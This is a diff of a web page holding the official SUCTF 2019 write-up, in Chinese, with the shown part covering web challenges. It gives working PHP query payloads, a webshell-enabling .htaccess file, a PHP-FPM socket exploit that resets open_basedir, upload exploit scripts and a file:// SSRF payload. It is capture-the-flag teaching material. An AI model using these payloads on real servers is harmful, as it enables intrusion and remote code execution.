@@ -1,4 +1,4 @@
-<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>SUCTF 2019 官方 Write up -</title><meta name=description content="以下是我们 SU 本次 SUCTF 的 官方writeup。"><meta name=author content="SUer"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"su-team","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/su-team.cn\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/su-team.cn\/post\/2019-suctf-official-writeup\/","name":"Suctf 2019 官方 write up"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"SUer"},"headline":"SUCTF 2019 官方 Write up","description":"以下是我们 SU 本次 SUCTF 的 官方writeup。\n","inLanguage":"en","wordCount":2837,"datePublished":"2019-08-22T00:00:00\u002b00:00","dateModified":"2019-08-22T00:00:00\u002b00:00","image":"https:\/\/su-team.cn\/img\/SU.jpg","keywords":["SUCTF"],"mainEntityOfPage":"https:\/\/su-team.cn\/post\/2019-suctf-official-writeup\/","publisher":{"@type":"Organization","name":"https:\/\/su-team.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/su-team.cn\/img\/SU.jpg","height":60,"width":60}}}</script><meta property="og:title" content="SUCTF 2019 官方 Write up"><meta property="og:description" content="以下是我们 SU 本次 SUCTF 的 官方writeup。"><meta property="og:image" content="https://su-team.cn/img/SU.jpg"><meta property="og:url" content="https://su-team.cn/post/2019-suctf-official-writeup/"><meta property="og:type" content="website"><meta property="og:site_name" content="su-team"><meta name=twitter:title content="SUCTF 2019 官方 Write up"><meta name=twitter:description content="以下是我们 SU 本次 SUCTF 的 官方writeup。"><meta name=twitter:image content="https://su-team.cn/img/SU.jpg"><meta name=twitter:card content="summary_large_image"><link href=https://su-team.cn/img/SU.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.148.2"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><link rel=stylesheet href=https://su-team.cn/css/katex.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/brands.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/fontawesome.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/regular.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/solid.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg-with-js.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-font-face.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-shims.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v5-font-face.min.css><link rel=stylesheet href=https://su-team.cn/css/bootstrap.min.css><link rel=stylesheet href=https://su-team.cn/css/main.css><link rel=stylesheet href=https://su-team.cn/css/fonts.css><link rel=stylesheet href=https://su-team.cn/css/highlight.min.css><link rel=stylesheet href=https://su-team.cn/css/codeblock.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.min.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.default-skin.min.css></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
+<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>SUCTF 2019 官方 Write up -</title><meta name=description content="以下是我们 SU 本次 SUCTF 的 官方writeup。"><meta name=author content="SUer"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"su-team","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/su-team.cn\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/su-team.cn\/post\/2019-suctf-official-writeup\/","name":"Suctf 2019 官方 write up"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"SUer"},"headline":"SUCTF 2019 官方 Write up","description":"以下是我们 SU 本次 SUCTF 的 官方writeup。\n","inLanguage":"en","wordCount":3850,"datePublished":"2019-08-22T00:00:00\u002b00:00","dateModified":"2019-08-22T00:00:00\u002b00:00","image":"https:\/\/su-team.cn\/img\/SU.jpg","keywords":["SUCTF"],"mainEntityOfPage":"https:\/\/su-team.cn\/post\/2019-suctf-official-writeup\/","publisher":{"@type":"Organization","name":"https:\/\/su-team.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/su-team.cn\/img\/SU.jpg","height":60,"width":60}}}</script><meta property="og:title" content="SUCTF 2019 官方 Write up"><meta property="og:description" content="以下是我们 SU 本次 SUCTF 的 官方writeup。"><meta property="og:image" content="https://su-team.cn/img/SU.jpg"><meta property="og:url" content="https://su-team.cn/post/2019-suctf-official-writeup/"><meta property="og:type" content="website"><meta property="og:site_name" content="su-team"><meta name=twitter:title content="SUCTF 2019 官方 Write up"><meta name=twitter:description content="以下是我们 SU 本次 SUCTF 的 官方writeup。"><meta name=twitter:image content="https://su-team.cn/img/SU.jpg"><meta name=twitter:card content="summary_large_image"><link href=https://su-team.cn/img/SU.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.148.2"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><link rel=stylesheet href=https://su-team.cn/css/katex.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/brands.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/fontawesome.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/regular.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/solid.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg-with-js.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-font-face.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-shims.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v5-font-face.min.css><link rel=stylesheet href=https://su-team.cn/css/bootstrap.min.css><link rel=stylesheet href=https://su-team.cn/css/main.css><link rel=stylesheet href=https://su-team.cn/css/fonts.css><link rel=stylesheet href=https://su-team.cn/css/syntax.css><link rel=stylesheet href=https://su-team.cn/css/codeblock.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.min.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.default-skin.min.css><style>.navbar-custom .avatar-container{width:72px;height:72px;left:50%;transform:translateX(-50%);margin-top:-36px;display:flex;align-items:center;justify-content:center;background:#fff;border-radius:50%;box-shadow:0 6px 18px rgba(0,0,0,.12)}.navbar-custom .avatar-container .avatar-img-border{width:100%;height:100%;border-radius:50%;overflow:hidden;margin:0;box-shadow:none}.navbar-custom .avatar-container .avatar-img{width:100%;height:100%;object-fit:cover;border-radius:50%}@media only screen and (min-width:768px){.navbar-custom .avatar-container{width:90px;height:90px;margin-top:-45px}}</style></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
 <span class=sr-only>Toggle navigation</span>
 <span class=icon-bar></span>
 <span class=icon-bar></span>
@@ -11,16 +11,50 @@
 <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
 </button>
 <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>SUCTF 2019 官方 Write up</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on August 22, 2019
-&nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;14&nbsp;minutes
-&nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;2837&nbsp;words
-&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer</span></div></div></div></div></div></header><div class=container role=main><div class="row flex-row"><div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs"><div class=toc-sidebar><h4 class=toc-title>#<br>TABLE OF CONTENTS</h4><div class=toc-card><nav id=TableOfContents><ul><li><a href=#web>Web</a><ul><li><ul><li><a href=#checkin>CheckIn</a></li><li><a href=#easyphp>EasyPHP</a><ul><li><a href=#第一层>第一层</a></li><li><a href=#第二层>第二层</a></li><li><a href=#第三层>第三层</a></li><li><a href=#exp>EXP</a><ul><li><a href=#exp1py>exp1.py</a></li><li><a href=#exp2py>exp2.py</a></li></ul></li></ul></li><li><a href=#pythonginx>pythonginx</a></li><li><a href=#upload-labs-2>Upload Labs 2</a></li><li><a href=#easy_sql>easy_sql</a></li><li><a href=#icloudmusic>iCloudMusic</a></li><li><a href=#cocktails-remix>Cocktail&rsquo;s Remix</a></li></ul></li><li><a href=#pwn>Pwn</a><ul><li><a href=#playfmt>playfmt</a></li><li><a href=#babystack>BabyStack</a></li><li><a href=#old_pc>old_pc</a><ul><li><ul><li><ul><li><a href=#exp-from-人人人>exp from 人人人</a></li><li><a href=#exp-from-kirin>exp from Kirin</a></li><li><a href=#exp-from-7o8v>exp from 7o8v</a></li></ul></li></ul></li></ul></li><li><a href=#sudrv>sudrv</a></li></ul></li><li><a href=#misc>Misc</a><ul><li><a href=#签到题>签到题</a></li><li><a href=#game>game</a></li><li><a href=#guess_game>guess_game</a></li><li><a href=#homerouter>homerouter</a></li><li><a href=#protocol>protocol</a></li></ul></li><li><a href=#rev>Rev</a><ul><li><a href=#hardcpp>hardCpp</a></li><li><a href=#rev-1>rev</a></li><li><a href=#akira-homework>Akira Homework</a></li><li><a href=#signin>SignIn</a></li><li><a href=#babyunic>babyunic</a></li></ul></li><li><a href=#crypto>Crypto</a></li></ul></li></ul></nav></div></div></div><div class="col-lg-9 col-md-9"><article role=main class=blog-post><p>以下是我们 SU 本次 SUCTF 的 官方writeup。</p><h1 id=web>Web</h1><h3 id=checkin>CheckIn</h3><p>一个比较老的上传技巧,但是貌似很少人知道，一些上传总结中都没有出现，github 开源项目 upload-lab 上也没有出现过，所以就拿来出题了。<code>.user.ini</code>适用于 php-fpm 的场景下的上传 trick，但是CTF比赛中貌似都还没有出现过，直接拿了国赛华东北赛区的一个上传绕过题目来改的，原本是直接 ban 掉了<code>htaccess</code>，防止大家思路跑偏，可是出题人打字太快了写成了<code>htacess</code>，就比较尴尬了。</p><p>参考<a href=https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html>user.ini文件构成的PHP后门</a></p><h3 id=easyphp>EasyPHP</h3><p>这道题没有什么全新的考点，就是三层绕过，但是第三层 fpm 绕过 disable_functions ，作为出题人要给大家谢罪了。。。忘记过滤了 ini_set ，结果导致大家都用的时 <a href=https://xz.aliyun.com/t/4720>bypass open_basedir的新方法</a> 这篇文章中的思路。另外还有 putenv，所以第三层基本上是废了 T_T。</p><h4 id=第一层>第一层</h4><p>黑名单执行，参考自 <a href=https://xz.aliyun.com/t/5677>https://xz.aliyun.com/t/5677</a> ，另外限制了长度。</p><p>Php的经典特性“Use of undefined constant”，会将代码中没有引号的字符都自动作为字符串，7.2开始提出要被废弃，不过目前还存在着。</p><p>Ascii码大于 0x7F 的字符都会被当作字符串，而和 0xFF 异或相当于取反，可以绕过被过滤的取反符号。</p><p>可以传入phpinfo，也可以进入第二层get_the_flag 函数</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=phpinfo
+&nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;19&nbsp;minutes
+&nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;3850&nbsp;words
+&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer</span></div></div></div></div></div></header><div class=container role=main><div class="row flex-row"><div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs"><div class=toc-sidebar><h4 class=toc-title>#<br>TABLE OF CONTENTS</h4><div class=toc-card><nav id=TableOfContents><ul><li><a href=#web>Web</a><ul><li><ul><li><a href=#checkin>CheckIn</a></li><li><a href=#easyphp>EasyPHP</a><ul><li><a href=#第一层>第一层</a></li><li><a href=#第二层>第二层</a></li><li><a href=#第三层>第三层</a></li><li><a href=#exp>EXP</a><ul><li><a href=#exp1py>exp1.py</a></li><li><a href=#exp2py>exp2.py</a></li></ul></li></ul></li><li><a href=#pythonginx>pythonginx</a></li><li><a href=#upload-labs-2>Upload Labs 2</a></li><li><a href=#easy_sql>easy_sql</a></li><li><a href=#icloudmusic>iCloudMusic</a></li><li><a href=#cocktails-remix>Cocktail&rsquo;s Remix</a></li></ul></li><li><a href=#pwn>Pwn</a><ul><li><a href=#playfmt>playfmt</a></li><li><a href=#babystack>BabyStack</a></li><li><a href=#old_pc>old_pc</a><ul><li><ul><li><ul><li><a href=#exp-from-人人人>exp from 人人人</a></li><li><a href=#exp-from-kirin>exp from Kirin</a></li><li><a href=#exp-from-7o8v>exp from 7o8v</a></li></ul></li></ul></li></ul></li><li><a href=#sudrv>sudrv</a></li></ul></li><li><a href=#misc>Misc</a><ul><li><a href=#签到题>签到题</a></li><li><a href=#game>game</a></li><li><a href=#guess_game>guess_game</a></li><li><a href=#homerouter>homerouter</a></li><li><a href=#protocol>protocol</a></li></ul></li><li><a href=#rev>Rev</a><ul><li><a href=#hardcpp>hardCpp</a></li><li><a href=#rev-1>rev</a></li><li><a href=#akira-homework>Akira Homework</a></li><li><a href=#signin>SignIn</a></li><li><a href=#babyunic>babyunic</a></li></ul></li><li><a href=#crypto>Crypto</a></li></ul></li></ul></nav></div></div></div><div class="col-lg-9 col-md-9"><article role=main class=blog-post><p>以下是我们 SU 本次 SUCTF 的 官方writeup。</p><h1 id=web>Web</h1><h3 id=checkin>CheckIn</h3><p>一个比较老的上传技巧,但是貌似很少人知道，一些上传总结中都没有出现，github 开源项目 upload-lab 上也没有出现过，所以就拿来出题了。<code>.user.ini</code>适用于 php-fpm 的场景下的上传 trick，但是CTF比赛中貌似都还没有出现过，直接拿了国赛华东北赛区的一个上传绕过题目来改的，原本是直接 ban 掉了<code>htaccess</code>，防止大家思路跑偏，可是出题人打字太快了写成了<code>htacess</code>，就比较尴尬了。</p><p>参考<a href=https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html>user.ini文件构成的PHP后门</a></p><h3 id=easyphp>EasyPHP</h3><p>这道题没有什么全新的考点，就是三层绕过，但是第三层 fpm 绕过 disable_functions ，作为出题人要给大家谢罪了。。。忘记过滤了 ini_set ，结果导致大家都用的时 <a href=https://xz.aliyun.com/t/4720>bypass open_basedir的新方法</a> 这篇文章中的思路。另外还有 putenv，所以第三层基本上是废了 T_T。</p><h4 id=第一层>第一层</h4><p>黑名单执行，参考自 <a href=https://xz.aliyun.com/t/5677>https://xz.aliyun.com/t/5677</a> ，另外限制了长度。</p><p>Php的经典特性“Use of undefined constant”，会将代码中没有引号的字符都自动作为字符串，7.2开始提出要被废弃，不过目前还存在着。</p><p>Ascii码大于 0x7F 的字符都会被当作字符串，而和 0xFF 异或相当于取反，可以绕过被过滤的取反符号。</p><p>可以传入phpinfo，也可以进入第二层get_the_flag 函数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=phpinfo
 </span></span><span class=line><span class=cl>?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=get_the_flag
-</span></span></code></pre></div><h4 id=第二层>第二层</h4><p>.htaccess文件上传，也算是屡见不鲜了</p><p>上传的 .htaccess文件可以为如下，我上传的文件是 zenis.pxp</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>#define width 1
+</span></span></code></pre></td></tr></table></div></div><h4 id=第二层>第二层</h4><p>.htaccess文件上传，也算是屡见不鲜了</p><p>上传的 .htaccess文件可以为如下，我上传的文件是 zenis.pxp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>#define width 1
 </span></span><span class=line><span class=cl>#define height 1
 </span></span><span class=line><span class=cl>AddType application/x-httpd-php .pxp
 </span></span><span class=line><span class=cl>php_value auto_append_file &#34;php://filter/convert.base64-decode/resource=zenis.pxp&#34;
-</span></span></code></pre></div><p>后面上传的文件可以加一个四个字符 b"\x18\x81\x7c\xf5"，这样base64之后开头就是 GIF89了</p><h4 id=第三层>第三层</h4><p>有了webshell后，发现有 open_basedir限制，在www目录下发现文件 F1AghhhhhhhhhhhhhHH ，但是发现是个假的 flag ，还提示说有 php7.2-fpm has been initialized in unix socket mode!</p><p>这里不难联想到 fpm 绕过 open_basedir，disable_functions等限制，参考<a href="https://bugs.php.net/bug.php?id=70134">open_basedir bypass with IP-based PHP-FPM</a>，今年不止考了一次了</p><p>php7.2-fpm.sock默认在</p><p>unix:///run/php/php7.2-fpm.sock</p><p>借用p神的脚本魔改一下，不过还要加上对 open_basedir 的重设</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#39;PHP_VALUE&#39;: &#39;auto_prepend_file = php://input&#39;+chr(0x0A)+&#39;open_basedir = /&#39;,
-</span></span></code></pre></div><h4 id=exp>EXP</h4><h5 id=exp1py>exp1.py</h5><p>改自 p 神的payload，这里贴出关键部分，可以生成base64版，以 GIF89a 开头的payload，</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>    def request(self, nameValuePairs={}, post=&#39;&#39;):
+</span></span></code></pre></td></tr></table></div></div><p>后面上传的文件可以加一个四个字符 b"\x18\x81\x7c\xf5"，这样base64之后开头就是 GIF89了</p><h4 id=第三层>第三层</h4><p>有了webshell后，发现有 open_basedir限制，在www目录下发现文件 F1AghhhhhhhhhhhhhHH ，但是发现是个假的 flag ，还提示说有 php7.2-fpm has been initialized in unix socket mode!</p><p>这里不难联想到 fpm 绕过 open_basedir，disable_functions等限制，参考<a href="https://bugs.php.net/bug.php?id=70134">open_basedir bypass with IP-based PHP-FPM</a>，今年不止考了一次了</p><p>php7.2-fpm.sock默认在</p><p>unix:///run/php/php7.2-fpm.sock</p><p>借用p神的脚本魔改一下，不过还要加上对 open_basedir 的重设</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#39;PHP_VALUE&#39;: &#39;auto_prepend_file = php://input&#39;+chr(0x0A)+&#39;open_basedir = /&#39;,
+</span></span></code></pre></td></tr></table></div></div><h4 id=exp>EXP</h4><h5 id=exp1py>exp1.py</h5><p>改自 p 神的payload，这里贴出关键部分，可以生成base64版，以 GIF89a 开头的payload，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>    def request(self, nameValuePairs={}, post=&#39;&#39;):
 </span></span><span class=line><span class=cl>        #if not self.__connect():
 </span></span><span class=line><span class=cl>        #    print(&#39;connect failure! please check your fasctcgi-server !!&#39;)
 </span></span><span class=line><span class=cl>        #    return
@@ -47,7 +81,22 @@
 </span></span><span class=line><span class=cl>    }
 </span></span><span class=line><span class=cl>    response = client.request(params, content)
 </span></span><span class=line><span class=cl>    print(force_text(response))
-</span></span></code></pre></div><h5 id=exp2py>exp2.py</h5><p>将 exp.py 生成的 payload 放到 exp 变量即可</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>import</span> <span class=n>requests</span>
+</span></span></code></pre></td></tr></table></div></div><h5 id=exp2py>exp2.py</h5><p>将 exp.py 生成的 payload 放到 exp 变量即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>import</span> <span class=n>requests</span>
 </span></span><span class=line><span class=cl>
 </span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://192.168.188.128:8810/&#34;</span>
 </span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;?_=${</span><span class=si>%f</span><span class=s2>f</span><span class=si>%f</span><span class=s2>f</span><span class=si>%f</span><span class=s2>f</span><span class=si>%f</span><span class=s2>f^%a0%b8%ba%ab}{</span><span class=si>%f</span><span class=s2>f}();&amp;</span><span class=si>%f</span><span class=s2>f=get_the_flag&#34;</span>
@@ -62,22 +111,47 @@
 </span></span><span class=line><span class=cl><span class=n>r2</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=n>payload</span><span class=p>,</span> <span class=n>files</span><span class=o>=</span><span class=n>files</span><span class=p>)</span>
 </span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r2</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
 </span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=n>r2</span><span class=o>.</span><span class=n>text</span><span class=p>)</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
-</span></span></code></pre></div><h3 id=pythonginx>pythonginx</h3><p>这是在刚刚举行的 black hat 2019 上看到的东西，感觉比较有意思，就拿来出题了。</p><p><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190819104652.png alt></p><p>//题目代码都没改多少，但是很多队伍都跑远了&mldr;orz</p><p>预期解：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>file://suctf.c℆sr%2ffffffflag @111
-</span></span></code></pre></div><p>这里我选用的是<code>℆</code>这个字符，再加上题目给的 nginx 提示，其实按照预期思路基本没有什么坑，就比较容易让人想到<code>/usr/local/nginx/conf/nginx.conf</code>这个 nginx 配置文件了，里面就有 flag 的位置。</p><p>看了很多师傅的非预期，感觉也挺有意思的，但是按照其他的思路来看这题就成了一道猜 flag 位置的题。（给师傅们磕头了，哐哐哐，是我太菜了&mldr;</p><p>问了一些师傅，都表示看了这篇文章，//vk师傅又读了一遍urllib的源码orz</p><p>其实html的提示就是想说 suctf.cc 是绑了 localhost ，大家可以不用管这个域名。</p><p>题外话，还有师傅真的把 suctf.cc 给买下来了&mldr;还买了一年 orz&mldr;然后还真有一个师傅跑偏到日 suctf.cc 去了&mldr;</p><p>哐哐哐给师傅们谢罪了</p><h3 id=upload-labs-2>Upload Labs 2</h3><p>题目直接给出了附件，代码不多，简单审计我们可以知道要<code>getFlag</code>就需要绕过<code>127.0.0.1</code>的限制，首先我们来看怎么绕过<code>127.0.0.1</code>的限制。
-在<code>class.php</code>中，我们可以很明显的看到存在</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=pythonginx>pythonginx</h3><p>这是在刚刚举行的 black hat 2019 上看到的东西，感觉比较有意思，就拿来出题了。</p><p><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190819104652.png alt></p><p>//题目代码都没改多少，但是很多队伍都跑远了&mldr;orz</p><p>预期解：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>file://suctf.c℆sr%2ffffffflag @111
+</span></span></code></pre></td></tr></table></div></div><p>这里我选用的是<code>℆</code>这个字符，再加上题目给的 nginx 提示，其实按照预期思路基本没有什么坑，就比较容易让人想到<code>/usr/local/nginx/conf/nginx.conf</code>这个 nginx 配置文件了，里面就有 flag 的位置。</p><p>看了很多师傅的非预期，感觉也挺有意思的，但是按照其他的思路来看这题就成了一道猜 flag 位置的题。（给师傅们磕头了，哐哐哐，是我太菜了&mldr;</p><p>问了一些师傅，都表示看了这篇文章，//vk师傅又读了一遍urllib的源码orz</p><p>其实html的提示就是想说 suctf.cc 是绑了 localhost ，大家可以不用管这个域名。</p><p>题外话，还有师傅真的把 suctf.cc 给买下来了&mldr;还买了一年 orz&mldr;然后还真有一个师傅跑偏到日 suctf.cc 去了&mldr;</p><p>哐哐哐给师傅们谢罪了</p><h3 id=upload-labs-2>Upload Labs 2</h3><p>题目直接给出了附件，代码不多，简单审计我们可以知道要<code>getFlag</code>就需要绕过<code>127.0.0.1</code>的限制，首先我们来看怎么绕过<code>127.0.0.1</code>的限制。
+在<code>class.php</code>中，我们可以很明显的看到存在</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
 </span></span><span class=line><span class=cl>    <span class=nv>$class</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>func</span><span class=p>);</span>
 </span></span><span class=line><span class=cl>    <span class=nv>$a</span> <span class=o>=</span> <span class=nv>$class</span><span class=o>-&gt;</span><span class=na>newInstanceArgs</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>file_name</span><span class=p>);</span>
 </span></span><span class=line><span class=cl>    <span class=nv>$a</span><span class=o>-&gt;</span><span class=na>check</span><span class=p>();</span>
 </span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span></code></pre></div><p>打ctf比较多的人可能会很熟悉，这是可以通过反射<code>SimpleXMLElement</code>来进行xxe，但是题目在 config.php 中把外部实体给限制了。
+</span></span></code></pre></td></tr></table></div></div><p>打ctf比较多的人可能会很熟悉，这是可以通过反射<code>SimpleXMLElement</code>来进行xxe，但是题目在 config.php 中把外部实体给限制了。
 但是从<code>$a->check();</code>的调用我们不难想到可以利用<code>SoapClient</code>来进行 SSRF ,利用条件就是要通过反序列化，那么怎么得到反序列化呢
